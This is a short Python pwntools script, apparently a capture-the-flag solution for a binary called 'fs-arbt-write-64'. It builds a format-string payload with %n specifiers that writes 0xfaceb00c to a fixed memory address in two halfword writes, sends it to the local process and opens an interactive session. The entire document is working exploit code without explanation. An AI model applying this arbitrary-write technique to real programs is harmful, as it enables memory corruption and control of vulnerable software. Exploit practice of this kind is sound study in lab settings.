#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-write-64')

print(p.recv())

addr = 0x60108c

first = 0xb00c

second = 0xface - 0xb00c

buf = "%" + "%05d" % first + "x"
buf += "%9$n"
buf += "%" + "%05d" % second + "x"
buf += "%10$nA"
buf += p64(addr)
buf += p64(addr + 2)

print(buf)

p.sendline(buf)

print(p.recv())

p.interactive()
